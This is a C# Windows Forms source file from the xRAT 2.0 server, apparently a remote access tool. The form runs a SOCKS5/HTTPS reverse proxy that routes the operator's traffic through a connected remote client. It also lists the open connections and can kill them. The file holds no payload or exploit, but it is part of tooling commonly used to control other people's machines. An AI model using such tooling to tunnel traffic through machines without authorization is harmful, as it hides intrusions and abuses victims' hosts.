using System;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.ReverseProxy;

namespace xServer.Forms
{
    public partial class FrmReverseProxy : Form
    {
        private readonly Client _connectClient;
        private ReverseProxyServer SocksServer { get; set; }
        private delegate void Invoky();
        private ReverseProxyClient[] OpenConnections;
        private Timer RefreshTimer;

        public FrmReverseProxy(Client client)
        {
            InitializeComponent();
            _connectClient = client;
            _connectClient.Value.FrmProxy = this;
        }

        private void FrmReverseProxy_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                SocksServer = new ReverseProxyServer();
                SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
                SocksServer.StartServer(_connectClient, "0.0.0.0", (int)nudServerPort.Value);
                btnStart.Enabled = false;
                btnStop.Enabled = true;

                RefreshTimer = new Timer();
                RefreshTimer.Tick += RefreshTimer_Tick;
                RefreshTimer.Interval = 100;
                RefreshTimer.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                btnStop_Click(sender, null);
            }
        }

        void RefreshTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                lock (SocksServer)
                {
                    this.OpenConnections = SocksServer.OpenConnections;
                    LvConnections.VirtualListSize = this.OpenConnections.Length;
                    LvConnections.Refresh();
                }
            }
            catch { }
        }

        void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
        {

        }

        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
        {

        }

        private string GetSizeStr(long size)
        {
            if (size > (1024 * 1024 * 1024))
                return (size / (1024 * 1024 * 1024)) + "GB";

            if (size > (1024 * 1024))
                return (size / (1024 * 1024)) + "MB";

            if (size > 1024)
                return (size / 1024) + "KB";

            return size + "B";
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            RefreshTimer.Stop();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            if (SocksServer != null)
                SocksServer.Stop();

            try
            {
                SocksServer.OnConnectionEstablished -= socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection -= socksServer_onUpdateConnection;
            }
            catch { }
        }

        private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            //Stop the proxy server if still active
            btnStop_Click(sender, null);



            if (_connectClient.Value != null)
                _connectClient.Value.FrmProxy = null;
        }

        private void nudServerPort_ValueChanged(object sender, EventArgs e)
        {
            lblProxyInfo.Text = string.Format("Connect to this SOCKS5/HTTPS Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
        }

        private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            lock (SocksServer)
            {
                if (e.ItemIndex < OpenConnections.Length)
                {
                    ReverseProxyClient Connection = OpenConnections[e.ItemIndex];

                    e.Item = new ListViewItem(new string[]
                    {
                        Connection.TargetServer,
                        Connection.TargetPort.ToString(),
                        GetSizeStr(Connection.LengthReceived),
                        GetSizeStr(Connection.LengthSended),
                        Connection.Type.ToString()
                    }) { Tag = Connection };
                }
            }
        }

        private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (SocksServer)
            {
                if (LvConnections.SelectedIndices.Count > 0)
                {
                    //copy the list, it could happen the suddenly the items de-select
                    int[] items = new int[LvConnections.SelectedIndices.Count];
                    LvConnections.SelectedIndices.CopyTo(items, 0);

                    foreach (int index in items)
                    {
                        if (index < OpenConnections.Length)
                        {
                            ReverseProxyClient Connection = OpenConnections[index];
                            if (Connection != null)
                            {
                                Connection.Disconnect();
                            }
                        }
                    }
                }
            }
        }
    }
}